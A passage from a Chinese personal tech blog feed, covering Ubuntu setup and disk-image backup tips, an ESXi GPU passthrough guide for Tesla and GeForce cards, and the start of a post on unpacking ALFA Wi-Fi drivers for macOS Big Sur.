<h3 id="开启虚拟桌面服务vncserver-virtuald-service"><a href="#开启虚拟桌面服务vncserver-virtuald-service" class="headerlink" title="开启虚拟桌面服务vncserver-virtuald.service"></a>开启虚拟桌面服务<code>vncserver-virtuald.service</code></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# apt install xserver-xorg-video-dummy</span><br><span class="line">root@One-Mix3-Pro:~# vncinitconfig --enable-system-xorg</span><br><span class="line">root@One-Mix3-Pro:~# systemctl enable vncserver-virtuald.service</span><br><span class="line">root@One-Mix3-Pro:~# systemctl start vncserver-virtuald.service</span><br><span class="line">root@One-Mix3-Pro:~# # To start a Virtual Mode instance (session), run the command: vncserver-virtual</span><br></pre></td></tr></table></figure>

<h3 id="盒盖不休眠"><a href="#盒盖不休眠" class="headerlink" title="盒盖不休眠"></a>盒盖不休眠</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# echo &quot;HandleLidSwitchExternalPower=ignore&quot; &gt;&gt; /etc/systemd/logind.conf</span><br><span class="line">root@One-Mix3-Pro:~# systemctl restart systemd-logind</span><br></pre></td></tr></table></figure>

<p>再装些有的没的常用软件，差不多基本配置就OK了，后面各个环境全部docker化吧，Ubuntu环境乱了很难受。</p>
<h3 id="设置BIOS时间为本地时间-local-time"><a href="#设置BIOS时间为本地时间-local-time" class="headerlink" title="设置BIOS时间为本地时间(local time)"></a>设置BIOS时间为本地时间(local time)</h3><p>Ubuntu默认视BIOS时间为UTC时间，这样对夏令时的兼容最好，业务系统建议保持默认以满足夏令时兼容性。<br>Windows默认视BIOS时间为本地时间(local time)，会导致两个系统时间不一致，个人电脑建议按以下方法将Ubuntu的RTC时间策略改为本地时间。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# timedatectl set-local-rtc 1</span><br></pre></td></tr></table></figure>

<h2 id="后续更新"><a href="#后续更新" class="headerlink" title="后续更新"></a>后续更新</h2><h3 id="2021-08-07"><a href="#2021-08-07" class="headerlink" title="2021-08-07"></a>2021-08-07</h3><ul>
<li>最近设备经常高温重启，从<code>https://extensions.gnome.org/extension/945/cpu-power-manager/</code>处添加gnome插件控制CPU频率，另外后续可以看一下<code>/sys/devices/virtual/thermal/cooling_device\*</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:/# for i in `ls /sys/devices/virtual/thermal`;do cat /sys/devices/virtual/thermal/$i/type;done</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">intel_powerclamp</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Fan</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">Processor</span><br><span class="line">INT3400 Thermal</span><br><span class="line">SEN3</span><br><span class="line">pch_skylake</span><br><span class="line">B0D4</span><br><span class="line">iwlwifi_1</span><br><span class="line">x86_pkg_temp</span><br></pre></td></tr></table></figure>
<h3 id="2023-06-01"><a href="#2023-06-01" class="headerlink" title="2023-06-01"></a>2023-06-01</h3><p>键盘好像坏了，A键时灵时不灵的，有时候自动aaaaaaaa的，甚至在win下经常跳出粘滞键。。。<br>准备做个全盘镜像，然后返厂修键盘。<br>重启按DEL进入bios，切换至U盘启动，Try Ubuntu，内置SSD设备为&#x2F;dev&#x2F;nvme0n1（nvme0是控制器设备，nvme0n1是磁盘块设备，nvme0n1p[1-9]是磁盘分区）。<br>找个移动硬盘，将磁盘完整dd出来（这里找个大的固态盘快一点）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份至移动硬盘 Portable-SSD-DIR/nvme-backup/ 目录，如果移动硬盘够大或者CPU不太行，可以不gzip</span></span><br><span class="line">dd if=/dev/nvme0n1 bs=4M status=progress | gzip -c | split -b 16G - /media/ubuntu/Portable-SSD-DIR/nvme-backup/nvme.img.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复至nvme，这里*会按文件名顺序匹配，同样，如果前面没用gzip，这里也要去掉gzip</span></span><br><span class="line">cat /media/ubuntu/Portable-SSD-DIR/nvme-backup/nvme.img.gz* | gzip -dc | dd of=/dev/nvme0n1 bs=4M status=progress</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>tips</tag>
        <tag>ubuntu</tag>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title>vmware ESXi 显卡直通 &amp; Tesla V100 显卡支持环境配置</title>
    <url>/2021/01/04/2021-01-04/</url>
    <content><![CDATA[<p>最近因为一些原因，对公司的机器学习服务器进行了重装，为了减少以后肉身去运维的次数，同时增加服务器的可扩展性，直接在物理机上装上了 ESXi。同时部署内部虚拟网络，增加透明代理。物理机上有4块 2080Ti 和2块 Tesla V100 显卡，通过 ESXi 的显卡直通，直接将 PCIe 设备添加进机器学习所用的虚拟机（看了下  NVIDIA Grid vGPU 的方案坑更多，遂放弃）。这里将这个过程中遇到的坑记录一下。</p>
<span id="more"></span>

<h2 id="GPU-Server-安装"><a href="#GPU-Server-安装" class="headerlink" title="GPU Server 安装"></a>GPU Server 安装</h2><h3 id="1-物理机-BIOS-开启扩展寻址"><a href="#1-物理机-BIOS-开启扩展寻址" class="headerlink" title="1. 物理机 BIOS 开启扩展寻址"></a>1. 物理机 BIOS 开启扩展寻址</h3><p>因为我这里的 V100 显卡单块显存有32GB，结合 nvidia 和 vmware 的相关文档，需要开启 BIOS 的高位宽寻址选项，可参考下图设置</p>
<img src="/2021/01/04/2021-01-04/bios-mmio.jpg" class="">

<h3 id="2-安装-ESXi-6-7-U3-updates"><a href="#2-安装-ESXi-6-7-U3-updates" class="headerlink" title="2. 安装 ESXi 6.7 U3 + updates"></a>2. 安装 ESXi 6.7 U3 + updates</h3><p>安装过程比较简单，默认安装即可，这里不做记录。因为之前遇到过 web UI 无法登陆的问题，为了保证不用去物理操作机器，安装完 ESXi 后在管理页面里开启 ssh，在<code>/etc/ssh/keys-root/authorized_keys</code>中添加 ssh 密钥并配置文件权限，更改 sshd 配置中的两条，禁用密码登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost:~] cat /etc/ssh/sshd_config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">......</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下两条为修改/新增内容，其他内容不变</span></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">......</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重启 ssh 服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost:~] /etc/init.d/SSH restart</span><br></pre></td></tr></table></figure>

<h3 id="3-配置-ESXi-显卡直通"><a href="#3-配置-ESXi-显卡直通" class="headerlink" title="3. 配置 ESXi 显卡直通"></a>3. 配置 ESXi 显卡直通</h3><p>硬件直通的原理示意图大致如下</p>
<img src="/2021/01/04/2021-01-04/esxi-passthru.png" class="">

<p>在管理选项卡的硬件里，过滤出 NVIDIA 设备，并选定相关设备，切换直通属性。</p>
<img src="/2021/01/04/2021-01-04/nvidia-pcie.jpg" class="">

<h3 id="4-创建虚拟机，将显卡添加至虚拟机设备"><a href="#4-创建虚拟机，将显卡添加至虚拟机设备" class="headerlink" title="4. 创建虚拟机，将显卡添加至虚拟机设备"></a>4. 创建虚拟机，将显卡添加至虚拟机设备</h3><p>首先按正常流程新建一个虚拟机 (兼容性选择 ESXi 6.7虚拟机 就可以)。因为有显卡直通，内存必须配置成预留所有。在虚拟机的虚拟硬件中，逐一添加显卡设备</p>
<img src="/2021/01/04/2021-01-04/vm-add-pcie.png" class="">

<p>添加的过程发现，同一台虚拟机不能直通太多的 PCIe 设备，但 2080Ti 显卡如果只直通一个主设备的话，虚拟机会出错。</p>
<p>经过多次试验，发现 2080Ti 设备只添加主设备和第二个设备 (USB 3.1 Host Controller) 时，机器运转正常。这样加上两张 V100，总共10个 PCIe 直通设备添加到虚拟机。</p>
<img src="/2021/01/04/2021-01-04/vm-pcie-list.jpg" class="">

<h3 id="5-额外的虚拟机参数配置"><a href="#5-额外的虚拟机参数配置" class="headerlink" title="5. 额外的虚拟机参数配置"></a>5. 额外的虚拟机参数配置</h3><p>在虚拟机设置中，添加或修改一些启动变量，配置路径如下图</p>
<img src="/2021/01/04/2021-01-04/boot-para.jpg" class="">

<p>分别添加以下参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">让N卡认为设备不在虚拟环境中</span></span><br><span class="line">hypervisor.cpuid.v0 = FALSE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭vmware默认显卡</span></span><br><span class="line">svga.present = FALSE # 安装完系统再设置，可能导致ESXi页面里虚拟显示器黑屏</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开 64bit 位宽寻址，如果没开这个将识别不到 V100 显卡</span></span><br><span class="line">pciPassthru.use64bitMMIO = TRUE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置 MMIO 内存大小（这里必须为2的整数次幂 power-of-two)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参考 https://kb.vmware.com/s/article/2142307 &amp; https://blogs.vmware.com/apps/2018/09/using-gpus-with-virtual-machines-on-vsphere-part-2-vmdirectpath-i-o.html ）</span></span><br><span class="line">pciPassthru.64bitMMIOSizeGB = 128</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vGPU 支持，看起来是对 Grid 的配置，加上也不影响，参考https://docs.nvidia.com/grid/4.7/grid-vgpu-release-notes-vmware-vsphere/index.html</span></span><br><span class="line">pciPassthru0.cfg.enable_large_sys_mem = 1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置模式为 IOAPIC，参考 https://www.vmware.com/pdf/vsp_4_vmdirectpath_host.pdf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多次查看启动日志，发现这里得把所有直通显卡设备都关了才行</span></span><br><span class="line">pciPassthru0.msiEnabled = FALSE</span><br><span class="line">pciPassthru1.msiEnabled = FALSE</span><br><span class="line">pciPassthru2.msiEnabled = FALSE</span><br><span class="line">pciPassthru3.msiEnabled = FALSE</span><br><span class="line">pciPassthru4.msiEnabled = FALSE</span><br><span class="line">pciPassthru5.msiEnabled = FALSE</span><br><span class="line">pciPassthru6.msiEnabled = FALSE</span><br><span class="line">pciPassthru7.msiEnabled = FALSE</span><br><span class="line">pciPassthru8.msiEnabled = FALSE</span><br><span class="line">pciPassthru9.msiEnabled = FALSE</span><br></pre></td></tr></table></figure>

<p>配置完成后，可以尝试挂载 iso ，进bios改引导进行系统安装，如果虚拟机启动不成功，可以 ssh 上去在虚拟机目录下 <code>tail -F vmware.log</code>看看哪里出错了，直通设备多启动会比较慢。</p>
<p>初次启动时，可能遇到如下错误:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vcpu-0| W115: CPU microcode update available.</span><br><span class="line">vcpu-0| W115+ The guest OS tried to update the microcode from patch level 67 (43h) to patch level 68 (44h), but VMware ESX does not allow microcode patches to be applied from within a virtual machine.</span><br><span class="line">vcpu-0| W115+ Microcode patches are used to correct CPU errata. You may be able to obtain a BIOS/firmware update which includes this microcode patch from your system vendor, or your host OS may provide a facility for loading microcode patches.APIC CMCI LVT write: 0xf9</span><br><span class="line">vcpu-0| I125: Tools: Tools heartbeat timeout.</span><br><span class="line">vcpu-0| I125: Tools: Running status rpc handler: 1 =&gt; 0.</span><br><span class="line">vcpu-0| I125: Tools: Changing running status: 1 =&gt; 0.</span><br></pre></td></tr></table></figure>
<p><del>可以在ESXi设置中禁用microcode更新，路径在<code>管理-&gt;系统-&gt;高级设置-&gt;VMkernel.Boot.microcodeUpdate-&gt;FALSE</code>。</del><br>升级ESXi补丁可以解决这个问题，先从<span class="exturl" data-url="aHR0cHM6Ly9teS52bXdhcmUuY29tL3BhdGNoLyNzZWFyY2g=" title="https://my.vmware.com/patch/#search">官网<i class="fa fa-external-link"></i></span>搜索并下载最新的补丁包，上传至ESXi，通过<code>esxcli software vib update -d &quot;Patch.zip&quot;</code>安装升级。<br>（参考<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnZtd2FyZS5jb20vZW4vVk13YXJlLXZTcGhlcmUvNi43L3JuL2VzeGk2NzAtMjAyMTAzMDAxLmh0bWw=" title="https://docs.vmware.com/en/VMware-vSphere/6.7/rn/esxi670-202103001.html">官网文档<i class="fa fa-external-link"></i></span>）</p>
<h3 id="6-系统问题"><a href="#6-系统问题" class="headerlink" title="6. 系统问题"></a>6. 系统问题</h3><p>我安装的是 ubuntu 桌面版，安装过程按照正常流程即可，安装完成后可能有以下问题。</p>
<h4 id="intel-microcode"><a href="#intel-microcode" class="headerlink" title="intel-microcode"></a>intel-microcode</h4><p>有一个 <code>intel-microcode</code> 软件包的更新，会导致系统重启后卡在黑屏。直接卸载这个软件貌似也没啥影响。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu:~# apt-get --purge remove intel-microcode</span><br></pre></td></tr></table></figure>

<h4 id="nouveau"><a href="#nouveau" class="headerlink" title="nouveau"></a>nouveau</h4><p>vmware 的虚拟硬件默认会有一个显卡，会导致系统加载一个 nouveau.ko 的显卡驱动，这个驱动与 nvidia 驱动冲突。</p>
<p>通过将 nouveau.ko 加入黑名单，禁用其加载。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu:~# cat &lt;&lt;EOF &gt;&gt; /etc/modprobe.d/blacklist-nouveau.conf</span><br><span class="line"></span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">root@gpu-ubuntu:~# update-initramfs -u</span><br><span class="line">root@gpu-ubuntu:~# shutdown -r 0             # 重启生效</span><br></pre></td></tr></table></figure>



<h3 id="7-待解决问题"><a href="#7-待解决问题" class="headerlink" title="7. 待解决问题"></a>7. 待解决问题</h3><p>N卡驱动安装完之后基本就可以用了，设备列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@gpu-ubuntu18:~# nvidia-smi</span><br><span class="line">Mon Jan  4 20:17:48 2021</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.80.02    Driver Version: 450.80.02    CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  Tesla V100-PCIE...  Off  | 00000000:03:00.0 Off |                    0 |</span><br><span class="line">| N/A   36C    P0    27W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  GeForce RTX 208...  Off  | 00000000:04:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   2  GeForce RTX 208...  Off  | 00000000:05:00.0 Off |                  N/A |</span><br><span class="line">| 27%   29C    P8    15W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   3  Tesla V100-PCIE...  Off  | 00000000:0B:00.0 Off |                    0 |</span><br><span class="line">| N/A   35C    P0    25W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   4  GeForce RTX 208...  Off  | 00000000:13:00.0 Off |                  N/A |</span><br><span class="line">| 27%   28C    P8     3W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   5  GeForce RTX 208...  Off  | 00000000:14:00.0 Off |                  N/A |</span><br><span class="line">| 27%   27C    P8     1W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">|  No running processes found                                                 |</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>ESXi 里的 PCIe 设备顺序和这里的对应关系没搞明白，试了好几次都没有把 V100 调整到前面，根据网上的一些资料，目前来看此问题暂时无解。</p>
<h3 id="8-后续更新"><a href="#8-后续更新" class="headerlink" title="8. 后续更新"></a>8. 后续更新</h3><h4 id="20210816"><a href="#20210816" class="headerlink" title="20210816"></a>20210816</h4><p>新添了一块NVIDIA Tesla A100 (40GB) 卡，直通进虚拟机后系统起不来了，查看ESXi中对应虚拟机的日志<code>/vmfs/volumes/[uuid]/[gpu-server]</code>，存在如下错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2021-08-16T08:19:19.467Z| vcpu-0| I125: [msg.efi.pciMmioError] The firmware could not allocate 202933248 KB of PCI MMIO. Increase the size of PCI MMIO and try again.</span><br></pre></td></tr></table></figure>
<p>修改虚拟机启动参数中的MMIO选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pciPassthru.64bitMMIOSizeGB = 256</span></span><br></pre></td></tr></table></figure>
<p>保存后启动正常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 450.102.04   Driver Version: 450.102.04   CUDA Version: 11.0     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  A100-PCIE-40GB      Off  | 00000000:03:00.0 Off |                    0 |</span><br><span class="line">| N/A   28C    P0    31W / 250W |      0MiB / 40537MiB |      0%      Default |</span><br><span class="line">|                               |                      |             Disabled |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  GeForce RTX 208...  Off  | 00000000:05:00.0 Off |                  N/A |</span><br><span class="line">| 30%   38C    P8    16W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   2  GeForce RTX 208...  Off  | 00000000:06:00.0 Off |                  N/A |</span><br><span class="line">| 29%   37C    P8    19W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   3  Tesla V100-PCIE...  Off  | 00000000:0C:00.0 Off |                    0 |</span><br><span class="line">| N/A   29C    P0    26W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   4  GeForce RTX 208...  Off  | 00000000:14:00.0 Off |                  N/A |</span><br><span class="line">| 28%   39C    P8     2W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   5  Tesla V100-PCIE...  Off  | 00000000:15:00.0 Off |                    0 |</span><br><span class="line">| N/A   29C    P0    24W / 250W |      0MiB / 32510MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   6  GeForce RTX 208...  Off  | 00000000:16:00.0 Off |                  N/A |</span><br><span class="line">| 27%   38C    P8     2W / 250W |      0MiB / 11019MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br></pre></td></tr></table></figure>

<h2 id="网络划分"><a href="#网络划分" class="headerlink" title="网络划分"></a>网络划分</h2><p>在 ESXi 里增加了一个 OpenWrt 网关作为 GPU Server 的上级路由，参考<span class="exturl" data-url="aHR0cHM6Ly9mb29sZW5nLmNvbS8yMDIwLzAzLzEwL3Ztd2FyZS1lc3hpLXNpbmdsZV9pcF9mb3JfbmF0Lw==" title="https://fooleng.com/2020/03/10/vmware-esxi-single_ip_for_nat/">“VMWARE ESXI 使用单个外网IP地址实现NAT”<i class="fa fa-external-link"></i></span>这篇文章，使用除原 manage network 之外额外的 IP 进行常规网络访问（双 IP 一个给路由 WAN，一个给 manage）</p>
<p>类似下图结构。</p>
<img src="/2021/01/04/2021-01-04/vm-lan.png" class="">]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>environment</tag>
        <tag>vmware</tag>
        <tag>ESXi</tag>
        <tag>nvidia</tag>
        <tag>deeplearning</tag>
      </tags>
  </entry>
  <entry>
    <title>macOS 11.2.3 Big Sur 安装 ALFA 网卡驱动</title>
    <url>/2021/03/20/2021-03-20/</url>
    <content><![CDATA[<p>手头有两张 alfa 网卡想要在 mac 下直接使用，官网驱动<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8/ZGlyPSU1QjElNUQlMjBXaUZpJTIwVVNCJTIwYWRhcHRlci9BV1VTMDM2QUNIL01BQyUyME9T" title="https://files.alfa.com.tw/?dir=%5B1%5D%20WiFi%20USB%20adapter/AWUS036ACH/MAC%20OS">AWUS036ACH<i class="fa fa-external-link"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8/ZGlyPSU1QjElNUQlMjBXaUZpJTIwVVNCJTIwYWRhcHRlci9BV1VTMDUxTkglMjB2Mi9NQUMlMjBPUw==" title="https://files.alfa.com.tw/?dir=%5B1%5D%20WiFi%20USB%20adapter/AWUS051NH%20v2/MAC%20OS">AWUS051NH v2<i class="fa fa-external-link"></i></span>最新的都只到10.14、10.15的样子，下载了几个版本的驱动发现同型号的binary差异都不大，这里尝试手动把安装包解包进行安装。</p>
<span id="more"></span>

<h3 id="下载并查看信息"><a href="#下载并查看信息" class="headerlink" title="下载并查看信息"></a>下载并查看信息</h3><p>以 AWUS036ACH 为例，下载<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5hbGZhLmNvbS50dy8lNUIxJTVEJTIwV2lGaSUyMFVTQiUyMGFkYXB0ZXIvQVdVUzAzNkFDSC9NQUMlMjBPUy9NQUNPUzEwLjE1L0FMRkElMjBVU0IlMjBXaUZpJTIwRHJpdmVyJTIwJTI4QnVpbGQlMjAwOTE5JTI5LnBrZw==" title="https://files.alfa.com.tw/%5B1%5D%20WiFi%20USB%20adapter/AWUS036ACH/MAC%20OS/MACOS10.15/ALFA%20USB%20WiFi%20Driver%20%28Build%200919%29.pkg">针对10.15版本的系统安装包<i class="fa fa-external-link"></i></span>，使用如下命令解压，并查看安装文件信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> test@mac:~/Downloads/alfa_036ach$ pkgutil --expand ALFA\ USB\ WiFi\ Driver\ \(Build\ 0919\).pkg 036install/</span><br><span class="line"> test@mac:~/Downloads/alfa_036ach$ cd 036install</span><br><span class="line"> test@mac:~/Downloads/alfa_036ach/036install$ for bom in `find ./ -name Bom`;do echo &quot;\n$bom\n&quot;;lsbom $bom;done</span><br><span class="line"></span><br><span class="line">.//Uninstall.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line"></span><br><span class="line">.//RealtekUtility1014.pkg/Bom</span><br><span class="line"></span><br><span class="line">.	40755	0/0</span><br><span class="line">./Library	40755	0/0</span><br><span class="line">./Library/Application Support	40755	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI	40755	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/RtWlanHelper	100777	0/80	164912	4191442806</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Info.plist	100777	0/80	6912	230658313</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/StatusBarApp	100777	0/80	2189968	3628228103</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/UnPref	100777	0/80	19344	3878423580</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/MacOS/wpa_supplicant	100777	0/80	3701248	1599320216</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/PkgInfo	100777	0/80	8	742937289</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_0.pdf	100777	0/80	36603	1484869705</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_1.pdf	100777	0/80	37352	4181603319</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_2.pdf	100777	0/80	37611	4109256582</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarConnecting_3.pdf	100777	0/80	37995	1459662728</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_0.icns	100777	0/80	26462	3234730549</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_1.icns	100777	0/80	26210	1286484566</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_2.icns	100777	0/80	25792	62513264</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_3.icns	100777	0/80	25052	387852725</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_4.icns	100777	0/80	24425	1078631272</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_5.icns	100777	0/80	23334	3487072564</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/BarSignal_disconnect.icns	100777	0/80	26823	1316734277</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Danish.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Danish.lproj/Localizable.strings	100777	0/80	14800	3311744630</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Dutch.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/Dutch.lproj/Localizable.strings	100777	0/80	15790	4268595270</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/InfoPlist.strings	100777	0/80	216	2032630058</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/Localizable.strings	100777	0/80	14532	3333036018</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/English.lproj/MainMenu.nib	100777	0/80	116130	1180232894</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/French.lproj	40777	0/80</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/French.lproj/Localizable.strings	100777	0/80	16772	3843437997</span><br><span class="line">./Library/Application Support/ALFA_RTWIFI/StatusBarApp.app/Contents/Resources/German.lproj	40777	0/80</span><br><span class="line">./Library/Application 